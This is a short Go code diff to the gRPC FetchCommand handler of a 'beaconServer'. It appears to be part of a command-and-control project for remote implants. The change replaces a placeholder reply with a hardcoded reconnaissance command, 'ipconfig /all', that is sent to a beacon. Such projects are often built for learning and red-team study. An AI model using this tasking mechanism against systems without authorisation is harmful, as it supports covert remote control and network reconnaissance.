@@ -20,7 +20,7 @@ func NewbeaconServer() *beaconServer {
 
 func (beaconServer *beaconServer) FetchCommand(context context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
 	cmd := new(grpcapi.Command)
-	cmd.Out = "This is FetchCommand"
+	cmd.In = "ipconfig /all"
 	log.Printf("recv cmd from server")
 	return cmd, nil
 }
